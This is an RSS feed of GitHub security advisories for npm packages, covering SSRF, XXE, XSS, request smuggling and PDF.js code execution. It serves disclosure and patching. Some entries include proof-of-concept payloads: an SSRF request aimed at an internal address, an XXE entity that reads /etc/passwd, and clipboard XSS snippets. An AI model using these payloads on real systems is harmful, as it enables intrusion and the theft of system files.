<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2024-05-12T02:12:52.665Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[@lobehub/chat] lobe-chat `/api/proxy` endpoint Server-Side Request Forgery vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-mxhq-xw3g-rphc</id>
        <link href="https://github.com/advisories/GHSA-mxhq-xw3g-rphc"/>
        <updated>2024-05-10T15:29:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The latest version of lobe-chat(by now v0.141.2) has an unauthorized ssrf vulnerability. An attacker can construct malicious requests to cause SSRF without logging in, attack intranet services, and leak sensitive information.</p>
<h3 id="details">Details</h3>
<ul>
<li>visit <a href="https://chat-preview.lobehub.com/settings/agent">https://chat-preview.lobehub.com/settings/agent</a>  </li>
<li>you can attack all internal services by /api/proxy and get the echo in http response :)</li>
</ul>
<p><img alt="image" src="https://github.com/lobehub/lobe-chat/assets/55245002/c2894c34-7333-4ae1-864c-3b212b95eb21"></p>
<p><img alt="image" src="https://github.com/lobehub/lobe-chat/assets/55245002/dd9ad696-7180-4700-8bff-1171a6a8ac91"></p>
<p><img alt="image" src="https://github.com/lobehub/lobe-chat/assets/55245002/e2b97520-a6d5-4939-8313-46db8a1c4b75"></p>
<h3 id="poc">PoC</h3>
<pre><code class="language-http">POST /api/proxy HTTP/2
Host: xxxxxxxxxxxxxxxxx
Cookie: LOBE_LOCALE=zh-CN; LOBE_THEME_PRIMARY_COLOR=undefined; LOBE_THEME_NEUTRAL_COLOR=undefined; _ga=GA1.1.86608329.1711346216; _ga_63LP1TV70T=GS1.1.1711346215.1.1.1711346846.0.0.0
Content-Length: 23
Sec-Ch-Ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: https://chat-preview.lobehub.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://chat-preview.lobehub.com/settings/agent
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7

http://172.23.0.1:8000/
</code></pre>
<h3 id="impact">Impact</h3>
<p>SSRF ,All users will be impacted.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lobehub/lobe-chat/security/advisories/GHSA-mxhq-xw3g-rphc">https://github.com/lobehub/lobe-chat/security/advisories/GHSA-mxhq-xw3g-rphc</a></li>
<li><a href="https://github.com/advisories/GHSA-mxhq-xw3g-rphc">https://github.com/advisories/GHSA-mxhq-xw3g-rphc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mxhq-xw3g-rphc</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-05-10T15:29:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[thelounge] thelounge may publicly disclose of all usernames/idents via port 113]]></title>
        <id>https://github.com/advisories/GHSA-g49q-jw42-6x85</id>
        <link href="https://github.com/advisories/GHSA-g49q-jw42-6x85"/>
        <updated>2024-05-09T21:31:38.000Z</updated>
        <content type="html"><![CDATA[<p>Per RFC 1413, The unique identifying tuple includes not only the ports, but also the both addresses. Without the addresses, the information becomes both non-unique and public:</p>
<ul>
<li>If multiple connections happen to use the same local port number (which is possible if the addresses differ), the username of the first is returned for all, resulting in the wrong ident for all but the first.</li>
<li>By not checking the connection address, the information becomes public. Because there is only a relatively small number of local ports, and the remote ports are likely to be either 6667 or 6697, it becomes trivial to scan the entire range to get a list of idents.</li>
</ul>
<p>To prevent this from happening, disable identd or upgrade to a non vulnerable version.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/thelounge/thelounge/security/advisories/GHSA-g49q-jw42-6x85">https://github.com/thelounge/thelounge/security/advisories/GHSA-g49q-jw42-6x85</a></li>
<li><a href="https://github.com/thelounge/thelounge/pull/4872">https://github.com/thelounge/thelounge/pull/4872</a></li>
<li><a href="https://github.com/advisories/GHSA-g49q-jw42-6x85">https://github.com/advisories/GHSA-g49q-jw42-6x85</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g49q-jw42-6x85</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-05-09T21:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Next.js Server-Side Request Forgery in Server Actions]]></title>
        <id>https://github.com/advisories/GHSA-fr5h-rqp8-mj6g</id>
        <link href="https://github.com/advisories/GHSA-fr5h-rqp8-mj6g"/>
        <updated>2024-05-09T21:18:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A Server-Side Request Forgery (SSRF) vulnerability was identified in Next.js Server Actions by security researchers at Assetnote. If the <code>Host</code> header is modified, and the below conditions are also met, an attacker may be able to make requests that appear to be originating from the Next.js application server itself.</p>
<h4 id="prerequisites">Prerequisites</h4>
<ul>
<li>Next.js (<code>&lt;14.1.1</code>) is running in a self-hosted* manner.</li>
<li>The Next.js application makes use of Server Actions.</li>
<li>The Server Action performs a redirect to a relative path which starts with a <code>/</code>.</li>
</ul>
<p>* Many hosting providers (including Vercel) route requests based on the Host header, so we do not believe that this vulnerability affects any Next.js applications where routing is done in this manner.</p>
<h3 id="patches">Patches</h3>
<p>This vulnerability was patched in <a href="https://github.com/vercel/next.js/pull/62561">#62561</a> and fixed in Next.js <code>14.1.1</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no official workarounds for this vulnerability. We recommend upgrading to Next.js <code>14.1.1</code>.</p>
<h3 id="credit">Credit</h3>
<p>Vercel and the Next.js team thank Assetnote for responsibly disclosing this issue to us, and for working with us to verify the fix. Thanks to:</p>
<p>Adam Kues - Assetnote
Shubham Shah - Assetnote</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g">https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g</a></li>
<li><a href="https://github.com/vercel/next.js/pull/62561">https://github.com/vercel/next.js/pull/62561</a></li>
<li><a href="https://github.com/vercel/next.js/commit/8f7a6ca7d21a97bc9f7a1bbe10427b5ad74b9085">https://github.com/vercel/next.js/commit/8f7a6ca7d21a97bc9f7a1bbe10427b5ad74b9085</a></li>
<li><a href="https://github.com/advisories/GHSA-fr5h-rqp8-mj6g">https://github.com/advisories/GHSA-fr5h-rqp8-mj6g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fr5h-rqp8-mj6g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-09T21:18:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Next.js Vulnerable to HTTP Request Smuggling]]></title>
        <id>https://github.com/advisories/GHSA-77r5-gw3j-2mpf</id>
        <link href="https://github.com/advisories/GHSA-77r5-gw3j-2mpf"/>
        <updated>2024-05-09T21:07:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Inconsistent interpretation of a crafted HTTP request meant that requests are treated as both a single request, and two separate requests by Next.js, leading to desynchronized responses. This led to a response queue poisoning vulnerability in the affected Next.js versions.</p>
<p>For a request to be exploitable, the affected route also had to be making use of the <a href="https://nextjs.org/docs/app/api-reference/next-config-js/rewrites">rewrites</a> feature in Next.js.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability is resolved in Next.js <code>13.5.1</code> and newer. This includes Next.js <code>14.x</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no official workarounds for this vulnerability. We recommend that you upgrade to a safe version.</p>
<h3 id="references">References</h3>
<p><a href="https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning">https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-77r5-gw3j-2mpf">https://github.com/vercel/next.js/security/advisories/GHSA-77r5-gw3j-2mpf</a></li>
<li><a href="https://github.com/vercel/next.js/commit/44eba020c615f0d9efe431f84ada67b81576f3f5">https://github.com/vercel/next.js/commit/44eba020c615f0d9efe431f84ada67b81576f3f5</a></li>
<li><a href="https://github.com/vercel/next.js/compare/v13.5.0...v13.5.1">https://github.com/vercel/next.js/compare/v13.5.0...v13.5.1</a></li>
<li><a href="https://github.com/advisories/GHSA-77r5-gw3j-2mpf">https://github.com/advisories/GHSA-77r5-gw3j-2mpf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-77r5-gw3j-2mpf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-09T21:07:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@cyclonedx/cyclonedx-library] @cyclonedx/cyclonedx-library Improper Restriction of XML External Entity Reference vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-38gf-rh2w-gmj7</id>
        <link href="https://github.com/advisories/GHSA-38gf-rh2w-gmj7"/>
        <updated>2024-05-08T19:55:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>XML External entity injections could be possible, when running the provided XML Validator on arbitrary input.</p>
<h4 id="poc">POC</h4>
<pre><code class="language-js">const {
  Spec: { Version },
  Validation: { XmlValidator }
} = require('@cyclonedx/cyclonedx-library');

const version = Version.v1dot5;
const validator = new XmlValidator(version);
const input = `&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE poc [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;bom xmlns="http://cyclonedx.org/schema/bom/1.5"&gt;
  &lt;components&gt;
    &lt;component type="library"&gt;
      &lt;name&gt;testing&lt;/name&gt;
      &lt;version&gt;1.337&lt;/version&gt;
      &lt;licenses&gt;
        &lt;license&gt;
          &lt;id&gt;&amp;xxe;&lt;/id&gt;&lt;!-- &lt;&lt; XML external entity (XXE) injection --&gt;
        &lt;/license&gt;
      &lt;/licenses&gt;
    &lt;/component&gt;
  &lt;/components&gt;
&lt;/bom&gt;`;

// validating this forged(^) input might lead to unintended behaviour
// for the fact that the XML external entity would be taken into account.
validator.validate(input).then(ve =&gt; {
  console.error('validation error', ve);
});
</code></pre>
<h3 id="patches">Patches</h3>
<p>This issue was fixed in <code>@cyclonedx/cyclonedx-library@6.7.1 </code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not run the provided XML validator on untrusted inputs.</p>
<h3 id="references">References</h3>
<ul>
<li>issue was introduced via <a href="https://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063">https://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063</a>.</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/CycloneDX/cyclonedx-javascript-library/security/advisories/GHSA-38gf-rh2w-gmj7">https://github.com/CycloneDX/cyclonedx-javascript-library/security/advisories/GHSA-38gf-rh2w-gmj7</a></li>
<li><a href="https://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063">https://github.com/CycloneDX/cyclonedx-javascript-library/pull/1063</a></li>
<li><a href="https://github.com/CycloneDX/cyclonedx-javascript-library/commit/5e5e1e0b9422f47d2de81c7c4064b803a01e7203">https://github.com/CycloneDX/cyclonedx-javascript-library/commit/5e5e1e0b9422f47d2de81c7c4064b803a01e7203</a></li>
<li><a href="https://github.com/advisories/GHSA-38gf-rh2w-gmj7">https://github.com/advisories/GHSA-38gf-rh2w-gmj7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-38gf-rh2w-gmj7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-08T19:55:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[trix] Trix Editor Arbitrary Code Execution Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-qjqp-xr96-cj99</id>
        <link href="https://github.com/advisories/GHSA-qjqp-xr96-cj99"/>
        <updated>2024-05-07T18:48:11.000Z</updated>
        <content type="html"><![CDATA[<p>The Trix editor, versions prior to 2.1.1, is vulnerable to arbitrary code execution when copying and pasting content from the web or other documents with markup into the editor. The vulnerability stems from improper sanitization of pasted content, allowing an attacker to embed malicious scripts which are executed within the context of the application.</p>
<p><strong>Vulnerable Versions</strong>: Up to 2.1.0</p>
<p><strong>Fixed Version</strong>: 2.1.1</p>
<p><strong>Vector</strong>:</p>
<ul>
<li><strong>Bug 1</strong>: When copying content manipulated by a script, such as:</li>
</ul>
<pre><code class="language-js">document.addEventListener('copy', function(e){
  e.clipboardData.setData('text/html', '&lt;div&gt;&lt;noscript&gt;&lt;div class="123&lt;/noscript&gt;456&lt;img src=1 onerror=alert(1)//"&gt;&lt;/div&gt;&lt;/noscript&gt;&lt;/div&gt;');
  e.preventDefault();
});
</code></pre>
<p>and pasting into the Trix editor, the script within the content is executed.</p>
<ul>
<li><strong>Bug 2</strong>: Similar execution occurs with content structured as:</li>
</ul>
<pre><code class="language-js">document.write(`copy&lt;div data-trix-attachment="{&amp;quot;contentType&amp;quot;:&amp;quot;text/html&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;&amp;lt;img src=1 onerror=alert(101)&amp;gt;HELLO123&amp;quot;}"&gt;&lt;/div&gt;me`);
</code></pre>
<h3 id="impact">Impact:</h3>
<p>An attacker could exploit these vulnerabilities to execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.</p>
<h3 id="remediation">Remediation:</h3>
<p><strong>Update Recommendation</strong>: Users should upgrade to Trix editor version 2.1.1 or later, which incorporates proper sanitization of input from copied content.</p>
<p><strong>CSP Enhancement</strong>: Additionally, enhancing the Content Security Policy (CSP) to disallow inline scripts can significantly mitigate the risk of such vulnerabilities. Set CSP policies such as script-src 'self' to ensure that only scripts hosted on the same origin are executed, and explicitly prohibit inline scripts using script-src-elem.</p>
<h3 id="references">References:</h3>
<ul>
<li><a href="https://github.com/basecamp/trix/releases/tag/v2.1.1">https://github.com/basecamp/trix/releases/tag/v2.1.1</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1147">https://github.com/basecamp/trix/pull/1147</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1149">https://github.com/basecamp/trix/pull/1149</a></li>
</ul>
<p><strong>Credit</strong>: These issues were reported by security researchers <a href="https://hackerone.com/loknop">loknop</a> and <a href="https://hackerone.com/pinpie">pinpie</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99">https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1147">https://github.com/basecamp/trix/pull/1147</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1149">https://github.com/basecamp/trix/pull/1149</a></li>
<li><a href="https://github.com/basecamp/trix/commit/1a5c68a14d48421fc368e30026f4a7918028b7ad">https://github.com/basecamp/trix/commit/1a5c68a14d48421fc368e30026f4a7918028b7ad</a></li>
<li><a href="https://github.com/basecamp/trix/commit/841ff19b53f349915100bca8fcb488214ff93554">https://github.com/basecamp/trix/commit/841ff19b53f349915100bca8fcb488214ff93554</a></li>
<li><a href="https://github.com/basecamp/trix/releases/tag/v2.1.1">https://github.com/basecamp/trix/releases/tag/v2.1.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34341">https://nvd.nist.gov/vuln/detail/CVE-2024-34341</a></li>
<li><a href="https://github.com/advisories/GHSA-qjqp-xr96-cj99">https://github.com/advisories/GHSA-qjqp-xr96-cj99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qjqp-xr96-cj99</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-07T16:49:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[react-pdf] react-pdf vulnerable to arbitrary JavaScript execution upon opening a malicious PDF with PDF.js]]></title>
        <id>https://github.com/advisories/GHSA-87hq-q4gp-9wr4</id>
        <link href="https://github.com/advisories/GHSA-87hq-q4gp-9wr4"/>
        <updated>2024-05-08T10:10:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>If PDF.js is used to load a malicious PDF, and PDF.js is configured with <code>isEvalSupported</code> set to <code>true</code> (which is the default value), unrestricted attacker-controlled JavaScript will be executed in the context of the hosting domain.</p>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/wojtekmaj/react-pdf/commit/671e6eaa2e373e404040c13cc6b668fe39839cad">This patch</a> forces <code>isEvalSupported</code> to <code>false</code>, removing the attack vector.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Set <code>options.isEvalSupported</code> to <code>false</code>, where <code>options</code> is <code>Document</code> component prop.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq">GHSA-wgrm-67xf-hhpq</a></li>
<li><a href="https://github.com/mozilla/pdf.js/pull/18015">https://github.com/mozilla/pdf.js/pull/18015</a></li>
<li><a href="https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6">https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1893645">https://bugzilla.mozilla.org/show_bug.cgi?id=1893645</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq">https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq</a></li>
<li><a href="https://github.com/wojtekmaj/react-pdf/security/advisories/GHSA-87hq-q4gp-9wr4">https://github.com/wojtekmaj/react-pdf/security/advisories/GHSA-87hq-q4gp-9wr4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34342">https://nvd.nist.gov/vuln/detail/CVE-2024-34342</a></li>
<li><a href="https://github.com/mozilla/pdf.js/pull/18015">https://github.com/mozilla/pdf.js/pull/18015</a></li>
<li><a href="https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6">https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6</a></li>
<li><a href="https://github.com/wojtekmaj/react-pdf/commit/208f28dd47fe38c33ce4bac4205b2b0a0bb207fe">https://github.com/wojtekmaj/react-pdf/commit/208f28dd47fe38c33ce4bac4205b2b0a0bb207fe</a></li>
<li><a href="https://github.com/wojtekmaj/react-pdf/commit/671e6eaa2e373e404040c13cc6b668fe39839cad">https://github.com/wojtekmaj/react-pdf/commit/671e6eaa2e373e404040c13cc6b668fe39839cad</a></li>
<li><a href="https://github.com/advisories/GHSA-87hq-q4gp-9wr4">https://github.com/advisories/GHSA-87hq-q4gp-9wr4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87hq-q4gp-9wr4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-07T16:48:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[react-pdf] react-pdf vulnerable to arbitrary JavaScript execution upon opening a malicious PDF with PDF.js]]></title>
        <id>https://github.com/advisories/GHSA-87hq-q4gp-9wr4</id>
        <link href="https://github.com/advisories/GHSA-87hq-q4gp-9wr4"/>
        <updated>2024-05-08T10:10:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>If PDF.js is used to load a malicious PDF, and PDF.js is configured with <code>isEvalSupported</code> set to <code>true</code> (which is the default value), unrestricted attacker-controlled JavaScript will be executed in the context of the hosting domain.</p>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/wojtekmaj/react-pdf/commit/671e6eaa2e373e404040c13cc6b668fe39839cad">This patch</a> forces <code>isEvalSupported</code> to <code>false</code>, removing the attack vector.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Set <code>options.isEvalSupported</code> to <code>false</code>, where <code>options</code> is <code>Document</code> component prop.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq">GHSA-wgrm-67xf-hhpq</a></li>
<li><a href="https://github.com/mozilla/pdf.js/pull/18015">https://github.com/mozilla/pdf.js/pull/18015</a></li>
<li><a href="https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6">https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1893645">https://bugzilla.mozilla.org/show_bug.cgi?id=1893645</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq">https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq</a></li>
<li><a href="https://github.com/wojtekmaj/react-pdf/security/advisories/GHSA-87hq-q4gp-9wr4">https://github.com/wojtekmaj/react-pdf/security/advisories/GHSA-87hq-q4gp-9wr4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34342">https://nvd.nist.gov/vuln/detail/CVE-2024-34342</a></li>
<li><a href="https://github.com/mozilla/pdf.js/pull/18015">https://github.com/mozilla/pdf.js/pull/18015</a></li>
<li><a href="https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6">https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6</a></li>
<li><a href="https://github.com/wojtekmaj/react-pdf/commit/208f28dd47fe38c33ce4bac4205b2b0a0bb207fe">https://github.com/wojtekmaj/react-pdf/commit/208f28dd47fe38c33ce4bac4205b2b0a0bb207fe</a></li>
<li><a href="https://github.com/wojtekmaj/react-pdf/commit/671e6eaa2e373e404040c13cc6b668fe39839cad">https://github.com/wojtekmaj/react-pdf/commit/671e6eaa2e373e404040c13cc6b668fe39839cad</a></li>
<li><a href="https://github.com/advisories/GHSA-87hq-q4gp-9wr4">https://github.com/advisories/GHSA-87hq-q4gp-9wr4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87hq-q4gp-9wr4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-07T16:48:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pdfjs-dist] PDF.js vulnerable to arbitrary JavaScript execution upon opening a malicious PDF]]></title>
        <id>https://github.com/advisories/GHSA-wgrm-67xf-hhpq</id>
        <link href="https://github.com/advisories/GHSA-wgrm-67xf-hhpq"/>
        <updated>2024-05-07T10:26:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If pdf.js is used to load a malicious PDF, and PDF.js is configured with <code>isEvalSupported</code> set to <code>true</code> (which is the default value), unrestricted attacker-controlled JavaScript will be executed in the context of the hosting domain.</p>
<h3 id="patches">Patches</h3>
<p>The patch removes the use of <code>eval</code>:
<a href="https://github.com/mozilla/pdf.js/pull/18015">https://github.com/mozilla/pdf.js/pull/18015</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>Set the option <code>isEvalSupported</code> to <code>false</code>. </p>
<h3 id="references">References</h3>
<p><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1893645">https://bugzilla.mozilla.org/show_bug.cgi?id=1893645</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq">https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq</a></li>
<li><a href="https://github.com/mozilla/pdf.js/pull/18015">https://github.com/mozilla/pdf.js/pull/18015</a></li>
<li><a href="https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6">https://github.com/mozilla/pdf.js/commit/85e64b5c16c9aaef738f421733c12911a441cec6</a></li>
<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1893645">https://bugzilla.mozilla.org/show_bug.cgi?id=1893645</a></li>
<li><a href="https://github.com/advisories/GHSA-wgrm-67xf-hhpq">https://github.com/advisories/GHSA-wgrm-67xf-hhpq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wgrm-67xf-hhpq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-07T10:25:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vditor] Vditor allows Cross-site Scripting via an attribute of an `A` element]]></title>
        <id>https://github.com/advisories/GHSA-m5jf-8crm-r65m</id>
        <link href="https://github.com/advisories/GHSA-m5jf-8crm-r65m"/>
        <updated>2024-05-03T20:38:16.000Z</updated>
        <content type="html"><![CDATA[<p>Vditor 3.10.3 allows XSS via an attribute of an <code>A</code> element.</p>
<p>NOTE: the vendor indicates that a user is supposed to mitigate this via <code>sanitize=true</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34449">https://nvd.nist.gov/vuln/detail/CVE-2024-34449</a></li>
<li><a href="https://github.com/Vanessa219/vditor/issues/1604">https://github.com/Vanessa219/vditor/issues/1604</a></li>
<li><a href="https://github.com/Vanessa219/vditor/blob/b3a14d6e4462b0c17141e1fcc66173264ada64e0/README_en_US.md?plain=1#L310">https://github.com/Vanessa219/vditor/blob/b3a14d6e4462b0c17141e1fcc66173264ada64e0/README_en_US.md?plain=1#L310</a></li>
<li><a href="https://github.com/advisories/GHSA-m5jf-8crm-r65m">https://github.com/advisories/GHSA-m5jf-8crm-r65m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m5jf-8crm-r65m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-03T18:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kurwov] kurwov vulnerable to Denial of Service due to improper data sanitization]]></title>
        <id>https://github.com/advisories/GHSA-hfrv-h3q8-9jpr</id>
        <link href="https://github.com/advisories/GHSA-hfrv-h3q8-9jpr"/>
        <updated>2024-05-03T20:30:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An unsafe sanitization of dataset contents on the <code>MarkovData#getNext</code> method used in <code>Markov#generate</code> and <code>Markov#choose</code> allows a maliciously crafted string on the dataset to throw and stop the function from running properly.</p>
<h3 id="details">Details</h3>
<p><a href="https://github.com/xiboon/kurwov/blob/0d58dfa42135ab40e830e92622857282f980ca89/src/MarkovData.ts#L38-L44">https://github.com/xiboon/kurwov/blob/0d58dfa42135ab40e830e92622857282f980ca89/src/MarkovData.ts#L38-L44</a></p>
<p>If a string contains a forbidden substring (i.e. <code>__proto__</code>) followed by a space character, the second line will access a special property in <code>MarkovData#finalData</code> by removing the last character of the string, bypassing the dataset sanitization (as it is supposed to be already sanitized before this function is called).</p>
<p><code>data</code> is then defined as the special function found in its prototype instead of an array.</p>
<p>On the last line, <code>data</code> is then indexed by a random number, which is supposed to return a string but returns undefined as it's a function. Calling <code>endsWith</code> then throws.</p>
<h3 id="poc">PoC</h3>
<p><a href="https://runkit.com/embed/m6uu40r5ja9b">https://runkit.com/embed/m6uu40r5ja9b</a></p>
<h3 id="impact">Impact</h3>
<p>Any dataset can be contaminated with the substring making it unable to properly generate anything in some cases.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/xiboon/kurwov/security/advisories/GHSA-hfrv-h3q8-9jpr">https://github.com/xiboon/kurwov/security/advisories/GHSA-hfrv-h3q8-9jpr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34075">https://nvd.nist.gov/vuln/detail/CVE-2024-34075</a></li>
<li><a href="https://github.com/xiboon/kurwov/commit/85d63e652594f121d6656177d7a3c0d823c976c9">https://github.com/xiboon/kurwov/commit/85d63e652594f121d6656177d7a3c0d823c976c9</a></li>
<li><a href="https://github.com/xiboon/kurwov/blob/0d58dfa42135ab40e830e92622857282f980ca89/src/MarkovData.ts#L38-L44">https://github.com/xiboon/kurwov/blob/0d58dfa42135ab40e830e92622857282f980ca89/src/MarkovData.ts#L38-L44</a></li>
